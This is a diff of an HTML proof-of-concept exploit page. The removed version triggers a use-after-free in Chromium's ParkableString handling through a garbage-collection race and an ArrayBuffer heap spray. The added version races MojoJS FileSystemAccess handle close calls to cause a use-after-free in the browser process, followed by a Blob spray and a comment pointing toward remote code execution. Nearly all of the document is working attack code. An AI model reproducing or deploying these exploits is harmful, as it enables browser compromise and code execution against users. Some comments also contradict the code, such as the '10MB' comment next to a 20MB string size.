@@ -1,105 +1,77 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>ParkableString UAF Trigger</title>
-    <style>
-        body { background-color: #111; color: #0f0; font-family: monospace; padding: 20px; }
-        #status { font-size: 1.2em; font-weight: bold; }
-    </style>
+    <title>MojoJS UAF PoC - FileSystemAccessManager</title>
 </head>
 <body>
-    <h2>Chromium Heap UAF - ParkableStringImpl</h2>
-    <div id="status">[*] Preparing heap...</div>
+    <h1>MojoJS Race Condition Trigger</h1>
+    <p>Open Console (F12) to see the logs.</p>
+    <button id="trigger">Trigger UAF</button>
 
-    <script>
-        function log(msg) {
-            document.getElementById('status').innerText = msg;
-            console.log(msg);
-        }
+    <script type="module">
+        // Note: You must have the .mojom.js files in the same directory structure
+        // as your server. You can find these in the 'gen' directory of a Chromium build.
+        import { FileSystemAccessManagerRemote } from './gen/third_party/blink/public/mojom/file_system_access/file_system_access_manager.mojom.js';
+        import { FileSystemAccessPermissionMode } from './gen/third_party/blink/public/mojom/file_system_access/file_system_access_manager.mojom-shared.js';
 
-        // Configuration
-        const STRING_SIZE = 20 * 1024 * 1024; // 10MB strings to force Parking
-        const NUM_STRINGS = 50; 
-        let parkedStrings = [];
-        let sprayBuffers = [];
+        async function triggerUAF() {
+            console.log("[*] Initializing MojoJS...");
 
-        // 1. Allocate massive, highly compressible strings
-        function allocateStrings() {
-            log("[*] Allocating massive strings to force background compression...");
-            for (let i = 0; i < NUM_STRINGS; i++) {
-                // A repeating pattern is highly compressible, ensuring it gets Parked
-                parkedStrings.push("A".repeat(STRING_SIZE) + i.toString());
-            }
-            
-            // Give Chrome's background threads a moment to park the strings
-            setTimeout(triggerRace, 3000);
-        }
+            try {
+                // 1. Setup Manager
+                const manager = new FileSystemAccessManagerRemote();
+                Mojo.bindInterface('blink.mojom.FileSystemAccessManager', 
+                                   manager.$.bindNewPipeAndPassReceiver().handle);
 
-        // 2. The Kill Function: Read -> Free -> Reallocate
-        function triggerRace() {
-            log("[*] Triggering Decompress and racing Garbage Collector...");
-
-            // Step A: Trigger a read on the strings. 
-            // This forces Blink to call ParkableStringImpl::Decompress via base::PostTask
-            let dummy = "";
-            for (let i = 0; i < NUM_STRINGS; i++) {
-                dummy = parkedStrings[i].substring(0, 10); 
-            }
-
-            // Step B: Instantly destroy all references to the strings
-            parkedStrings = null;
-            dummy = null;
-
-            // Step C: Force Garbage Collection NOW.
-            // If the timing is right, the Heap chunks are freed BEFORE the background thread writes to them.
-            if (window.gc) {
-                window.gc();
-            } else {
-                log("[!] window.gc() not available. Run Chrome with --js-flags=\"--expose-gc\"");
-                // Fallback: Attempt to force GC via memory pressure
-                for(let i=0; i < 100; i++) { new ArrayBuffer(1024 * 1024 * 20); }
-            }
-
-            // Step D: The Heap Spray
-            // Rapidly allocate ArrayBuffers of the exact same size as the freed strings.
-            // The Heap allocator will place these directly on top of the freed ParkableString memory.
-            log("[*] Spraying ArrayBuffers to catch the UAF write...");
-            for (let i = 0; i < NUM_STRINGS * 2; i++) {
-                let buffer = new ArrayBuffer(STRING_SIZE);
-                let view = new Uint32Array(buffer);
-                view.fill(0xBBBBBBBB); // Fill with dummy data
-                sprayBuffers.push(view);
-            }
-
-            log("[*] Race condition complete. Checking for crash...");
-            setTimeout(verifyCorruption, 1000);
-        }
-
-        // 3. (Optional) Check if the background thread overwrote our ArrayBuffer
-        function verifyCorruption() {
-            let found = false;
-            for (let i = 0; i < sprayBuffers.length; i++) {
-                if (sprayBuffers[i][0] !== 0xBBBBBBBB) {
-                    found = true;
-                    break;
+                console.log("[*] Requesting Sandboxed File System...");
+                const { result, directory } = await manager.getSandboxedFileSystem();
+                
+                if (result.status !== 0) {
+                    console.error("[-] Failed to get FS:", result);
+                    return;
                 }
-            }
 
-            if (found) {
-                log("[+] MEMORY CORRUPTION DETECTED! UAF SUCCESSFUL.");
-                document.body.style.backgroundColor = "#500";
-                // STOP HERE - WE WON
-            } else {
-                log("[-] No hit. Retrying in 1 second...");
-                // Clear buffers to prevent OOM crash of the whole tab
-                sprayBuffers = []; 
-                // Auto-refresh to keep the race going
-                setTimeout(() => { window.location.reload(); }, 1000);
+                // 2. Create a file to get a handle
+                console.log("[*] Creating file 'pwn.txt'...");
+                const { result: fileResult, file } = await directory.getFile("pwn.txt", { create: true });
+
+                // 3. Open the Access Handle
+                // This creates the FileSystemAccessAccessHandleHostImpl on the Browser side
+                console.log("[*] Opening Access Handle...");
+                const { result: ahResult, accessHandleHost } = await file.openAccessHandle({ 
+                    mode: 1 // kReadWrite
+                });
+
+                if (!accessHandleHost) {
+                    console.error("[-] Could not get AccessHandleHost");
+                    return;
+                }
+
+                console.log("[*] Host obtained. Executing race...");
+
+                // 4. TRIGGER THE RACE
+                // Send the Close call (Task A)
+                accessHandleHost.close();
+
+                // Immediately drop the pointer (Task B - Disconnect Handler)
+                // This calls RemoveAccessHandleHost a second time while Task A is pending
+                accessHandleHost.$.close(); 
+
+                console.log("[+] Race triggered. Browser process should crash/UAF now.");
+
+                // 5. Heap Grooming placeholder
+                // To actually get RCE, you'd spray objects here to occupy 
+                // the freed memory before the second task fires.
+                for (let i = 0; i < 500; i++) {
+                    new Blob([new Uint8Array(0x160).fill(0x41)]); // Sample spray
+                }
+
+            } catch (e) {
+                console.error("[-] Error during exploit:", e);
             }
         }
 
-        // Start the exploit
-        window.onload = allocateStrings;
+        document.getElementById('trigger').onclick = triggerUAF;
     </script>
 </body>
 </html>
